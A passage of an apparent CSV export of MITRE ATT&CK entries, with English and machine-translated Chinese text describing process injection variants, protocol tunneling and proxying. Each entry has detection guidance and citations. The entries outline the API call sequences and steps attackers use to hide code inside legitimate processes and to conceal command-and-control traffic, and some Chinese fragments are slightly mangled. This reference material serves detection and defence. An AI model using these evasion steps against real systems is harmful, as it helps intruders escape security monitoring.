Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,File: File Modification,True,T1055,"Anti-virus, Application control",,,,,,,,",",进程注入：进程内存,攻击者可能会通过 /proc 文件系统将恶意代码注入进程，以逃避基于进程的防御并可能提升权限。 Proc 内存注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 Proc 内存注入涉及通过 /proc 文件系统 (<code>/proc/[pid]</code>) 枚举进程的内存，然后使用可用的小工具/指令制作面向返回的编程 (ROP) 有效负载。每个正在运行的进程都有自己的目录，其中包括内存映射。 Proc 内存注入通常通过使用 /proc 文件系统提供的内存映射覆盖目标进程的堆栈来执行。此信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意负载的指令），否则会被地址空间布局随机化 (ASLR) 等进程内存保护隐藏。枚举后，<code>/proc/[pid]/maps</code> 中的目标进程的内存映射可以使用 dd 覆盖。（Citation: Uninformed Needle）（Citation: GDS Linux Injection）（Citation: DD Man） [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) 等其他技术可用于使用更多可用小工具填充目标进程。类似于 [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)，proc 内存注入可能针对子进程（例如 sleep 的后台副本）。（引用：GDS Linux Injection）运行代码在另一个进程的上下文中，可能允许访问该进程的内存、系统/网络资源以及可能提升的特权。通过 proc 内存注入执行也可能逃避安全产品的检测，因为该执行在合法进程下被屏蔽。
T1055.013,Process Injection: Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. 

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.

This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/013,14 January 2020,09 February 2021,1.0,"Defense Evasion, Privilege Escalation","Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)

Scan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",Windows,"File: File Metadata, Process: OS API Execution",True,T1055,"Anti-virus, Application control",,"Administrator, SYSTEM, User",,,,,,"(Citation: NCC Group Team9 June 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cybereason Bazar July 2020),(Citation: Symantec Leafminer July 2018),(Citation: Kaspersky Lab SynAck May 2018),",进程注入：进程分身,攻击者可能会通过进程分身将恶意代码注入进程，以逃避基于进程的防御并可能提升权限。 Process doppelgänging 是一种在单独的活动进程的地址空间中执行任意代码的方法。 Windows Transactional NTFS (TxF) 作为一种执行安全文件操作的方法在 Vista 中被引入。 （引用：Microsoft TxF）为确保数据完整性，TxF 仅允许一个事务处理句柄在给定时间写入文件。在写入句柄事务终止之前，所有其他句柄都与写入器隔离，并且只能读取在打开句柄时存在的文件的提交版本。 （引用：Microsoft Basic TxF 概念）为避免损坏，如果系统或应用程序在写入事务期间发生故障，TxF 会执行自动回滚。 （引文：Microsoft 在哪里使用 TxF）虽然已弃用，但 TxF 应用程序编程接口 (API) 自 Windows 10 起仍处于启用状态。（引文：BlackHat Process Doppelgänging Dec 2017）攻击者可能滥用 TxF 来执行无文件变体[过程注入](https://attack.mitre.org/techniques/T1055)。与 [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) 类似，进程分身涉及替换合法进程的内存，从而能够隐蔽执行可能逃避防御和检测的恶意代码。 Process doppelgänging 对 TxF 的使用也避免了使用高度监控的 API 函数，例如 <code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code> 和 <code>SetThreadContext</code>。 （引用：BlackHat Process Doppelgänging 2017 年 12 月）流程 Doppelgänging 分 4 个步骤实现（引用：BlackHat Process Doppelgänging 2017 年 12 月）： * 交易 - 使用合法可执行文件创建 TxF 交易，然后用恶意代码覆盖文件。这些更改将是孤立的，并且仅在事务的上下文中可见。 * 加载——创建内存的共享部分并加载恶意可执行文件。 * 回滚——撤消对原始可执行文件的更改，有效地从文件系统中删除恶意代码。 * Animate – 从受污染的内存部分创建一个进程并启动执行。这种行为可能不会导致特权提升，因为注入的进程是从注入进程的（并因此继承了安全上下文）产生的。但是，通过进程分身执行可能会逃避安全产品的检测，因为该执行在合法进程下被掩盖。
T1055.012,Process Injection: Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/012,14 January 2020,29 November 2021,1.2,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Processing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,,"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: EFF Manul Aug 2016),(Citation: S2 Grupo TrickBot June 2017),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ATT QakBot April 2021),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Securelist LuckyMouse June 2018),(Citation: Symantec W32.Duqu),(Citation: Profero APT27 December 2020),(Citation: Infoblox Lokibot January 2019),(Citation: Trend Micro Totbrick Oct 2016),(Citation: FireEye NETWIRE March 2019),(Citation: FireEye Ursnif Nov 2017),(Citation: Palo Alto Networks BBSRAT),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Securelist Dtrack),(Citation: OilRig New Delivery Oct 2017),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Cybereason Bazar July 2020),(Citation: Accenture Hogfish April 2018),(Citation: Microsoft Dofoil 2018),(Citation: Cymmetria Patchwork),(Citation: Talos Kimsuky Nov 2021),(Citation: Talos Lokibot Jan 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: Microsoft Totbrick Oct 2017),(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Lookout Dark Caracal Jan 2018),(Citation: SentinelLabs Agent Tesla Aug 2020),",进程注入：进程空心化,攻击者可能会将恶意代码注入到暂停和空心的进程中，以逃避基于进程的防御。进程空心是一种在单独的活动进程的地址空间中执行任意代码的方法。进程挖空通常是通过创建一个处于挂起状态的进程然后取消映射/挖空其内存来执行的，然后可以用恶意代码替换它。可以使用本地 Windows API 调用（例如 <code>CreateProcess</code>）创建受害进程，其中包含一个用于挂起进程主线程的标志。此时，可以在写入之前使用 API 调用（例如 <code>ZwUnmapViewOfSection</code> 或 <code>NtUnmapViewOfSection</code>）取消映射进程，重新对齐注入的代码，并通过 <code>VirtualAllocEx</code> 恢复code>，<code>WriteProcessMemory</code>，<code>SetThreadContext</code>，然后是 <code>ResumeThread</code>。（引用：Leitch Hollowing）（引用：Elastic Process Injection July 2017）这非常类似于 [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) 但创建一个新进程而不是针对现有进程。这种行为可能不会导致特权提升，因为注入的进程是从注入进程的（并因此继承了安全上下文）产生的。但是，通过进程空心化执行也可能逃避安全产品的检测，因为该执行在合法进程下被屏蔽。
T1055.008,Process Injection: Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. 

Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) 

Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/008,14 January 2020,18 October 2021,1.1,"Defense Evasion, Privilege Escalation","Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,,",",进程注入：Ptrace 系统调用,攻击者可能通过 ptrace（进程跟踪）系统调用将恶意代码注入进程，以逃避基于进程的防御并可能提升权限。 Ptrace 系统调用注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 Ptrace 系统调用注入涉及附加到和修改正在运行的进程。 ptrace 系统调用使调试进程能够观察和控制另一个进程（以及每个单独的线程），包括更改内存和寄存器值。（引用：PTRACE man）Ptrace 系统调用注入通常通过将任意代码写入正在运行的进程中来执行（例如：<code>malloc</code>) 然后使用 <code>PTRACE_SETREGS</code> 调用该内存以设置包含要执行的下一条指令的寄存器。 Ptrace 系统调用注入也可以使用 <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code> 来完成，它将数据复制到目标进程内存中的特定地址（例如：下一条指令的当前地址）。 （引用：PTRACE man）（引用：Medium Ptrace JUL 2018）Ptrace 系统调用注入可能无法针对非子进程和/或具有更高权限的进程。（引用：BH Linux Inject）在上下文中运行代码另一个进程的权限可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过 ptrace 系统调用注入执行也可能逃避安全产品的检测，因为该执行在合法进程下被屏蔽。
T1055.003,Process Injection: Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. 

Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)

This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/003,14 January 2020,18 October 2021,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,,"(Citation: ESET Gazer Aug 2017),(Citation: Trend Micro Waterbear December 2019),(Citation: Secureworks Karagany July 2019),(Citation: Securelist WhiteBear Aug 2017),",进程注入：线程执行劫持,攻击者可能会将恶意代码注入被劫持的进程中，以逃避基于进程的防御以及可能提升权限。线程执行劫持是一种在单独的活动进程的地址空间中执行任意代码的方法。线程执行劫持通常通过暂停现有进程然后取消映射/挖空其内存来执行，然后可以将其替换为恶意代码或 DLL 的路径。现有受害者进程的句柄首先使用本地 Windows API 调用（例如 <code>OpenThread</code>）创建。此时进程可以暂停，然后写入，重新对齐注入的代码，并通过 <code>SuspendThread </code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code> 恢复进程>SetThreadContext</code>，然后分别是 <code>ResumeThread</code>。（引用：Elastic Process Injection July 2017）这与 [Process Hollowing] 非常相似（https://attack.mitre.org/techniques/T1055 /012) 但以现有进程为目标，而不是创建处于挂起状态的进程。在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过线程执行劫持执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.005,Process Injection: Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. 

TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/005,14 January 2020,18 October 2021,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,,"(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye Ursnif Nov 2017),(Citation: TrendMicro PE_URSNIF.A2),",进程注入：线程本地存储,攻击者可能会通过线程本地存储 (TLS) 回调将恶意代码注入进程，以规避基于进程的防御并可能提升权限。 TLS 回调注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 TLS 回调注入涉及操纵可移植可执行文件 (PE) 中的指针，以在到达代码的合法入口点之前将进程重定向到恶意代码。操作系统通常使用 TLS 回调来设置和/或清理线程使用的数据。可以通过使用其他 [Process Injection](https://attack.mitre.org/techniques/T1055) 技术，例如 [Process Hollowing](https: //attack.mitre.org/techniques/T1055/012）。（引用：FireEye TLS Nov 2017）在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过 TLS 回调注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.014,Process Injection: VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. 

VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",https://attack.mitre.org/techniques/T1055/014,14 January 2020,07 July 2022,1.1,"Defense Evasion, Privilege Escalation","Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Linux,"Module: Module Load, Process: OS API Execution",True,T1055,"Anti-virus, Application control",,,,,,,,",",进程注入：VDSO 劫持,攻击者可能会通过 VDSO 劫持将恶意代码注入进程，以逃避基于进程的防御并可能提升权限。虚拟动态共享对象 (vdso) 劫持是一种在单独的活动进程的地址空间中执行任意代码的方法。 VDSO 劫持涉及将调用重定向到动态链接的共享库。内存保护可能会阻止通过 [Ptrace 系统调用](https://attack.mitre.org/techniques/T1055/008) 将可执行代码写入进程。但是，攻击者可能会劫持从 vdso 共享对象映射到进程的系统调用接口代码存根，以执行系统调用来打开和映射恶意共享对象。然后可以通过存储在进程的全局偏移表（存储映射库函数的绝对地址）中的修补内存地址引用重定向进程的执行流来调用此代码。（引文：ELF 注入 2009 年 5 月）（引文：回溯VDSO）（引用：VDSO 2005 年 8 月）（引用：Syscall 2014）在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源以及可能提升的权限。通过 VDSO 劫持执行也可能逃避安全产品的检测，因为执行在合法进程下被掩盖。
T1572,Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. 

There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) 

[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) 

Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",https://attack.mitre.org/techniques/T1572,15 March 2020,27 March 2020,1.0,Command and Control,"Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. 

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye Maze May 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec W32.Duqu),(Citation: PTSecurity Cobalt Dec 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Kaspersky QakBot September 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Cobalt Group July 2018),(Citation: cobaltstrike manual),(Citation: Cyware Ngrok May 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: NCC Group Chimera January 2021),(Citation: FireEye FIN6 April 2016),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: Mythc Documentation),(Citation: MalwareBytes Ngrok February 2020),(Citation: FireEye APT34 July 2019),(Citation: Trend Micro Ngrok September 2020),(Citation: Dragos Crashoverride 2017),(Citation: CrowdStrike PIONEER KITTEN August 2020),",隧道协议,攻击者可能会在单独的协议中通过隧道与受害系统进行网络通信，以避免检测/网络过滤和/或启用对其他无法访问的系统的访问。隧道涉及将协议显式封装在另一个协议中。此行为可能会通过与现有流量混合和/或提供外层加密（类似于 VPN）来隐藏恶意流量。隧道还可以实现网络数据包的路由，否则这些数据包将无法到达其预期目的地，例如 SMB、RDP 或其他会被网络设备过滤或不会通过 Internet 路由的流量。有多种方法可以将一个协议封装在另一个协议中。例如，攻击者可能会执行 SSH 隧道（也称为 SSH 端口转发），这涉及通过加密的 SSH 隧道转发任意数据。（引用：SSH 隧道）[协议隧道]（https://attack.mitre.org/techniques /T1572) 也可能在 [Dynamic Resolution] (https://attack.mitre.org/techniques/T1568) 期间被对手滥用。被称为 DNS over HTTPS (DoH)，解析 C2 基础设施的查询可以封装在加密的 HTTPS 数据包中。（引用：BleepingComp Godlua JUL19）攻击者还可以利用 [协议隧道]（https://attack.mitre.org/techniques/ T1572) 结合 [Proxy](https://attack.mitre.org/techniques/T1090) 和/或 [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) 进一步隐藏C2 通信和基础设施。
T1090,Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.

Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",https://attack.mitre.org/techniques/T1090,31 May 2017,30 August 2021,3.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Consider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Heather Linn; Jon Sheedy; Walker Johnson,,,,,,,"(Citation: ProofPoint Ursnif Aug 2016),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Kaspersky Adwind Feb 2016),(Citation: US-CERT BADCALL),(Citation: CheckPoint Naikon May 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: US-CERT HARDRAIN March 2018),(Citation: ESET Turla PowerShell May 2019),(Citation: Zdnet Ngrok September 2018),(Citation: FoxIT Wocao December 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Check Point Warzone Feb 2020),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Checkpoint Dridex Jan 2021),(Citation: Microsoft POLONIUM June 2022),(Citation: GitHub QuasarRAT),(Citation: JPCert BlackTech Malware September 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Windigo Mar 2014),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT41 Aug 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Talos ZxShell Oct 2014),(Citation: Volexity Patchwork June 2018),(Citation: Crowdstrike DNC June 2016),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: ESET Telebots Dec 2016),(Citation: Bitdefender Naikon April 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: GitHub PoshC2),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: NJCCIC Ursnif Sept 2016),(Citation: Dell Dridex Oct 2015),(Citation: Red Canary NETWIRE January 2020),(Citation: MalwareBytes Ngrok February 2020),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ESET ForSSHe December 2018),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Riskiq Remcos Jan 2018),(Citation: Symantec Vasport May 2012),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: NCSC Joint Report Public Tools),(Citation: Check Point Pay2Key November 2020),(Citation: Operation Quantum Entanglement),(Citation: Securelist fileless attacks Feb 2017),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: University of Birmingham C2)",代理,攻击者可以使用连接代理来引导系统之间的网络流量，或者充当与命令和控制服务器进行网络通信的中介，以避免直接连接到他们的基础设施。存在许多通过代理或端口重定向实现流量重定向的工具，包括 [HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy 和 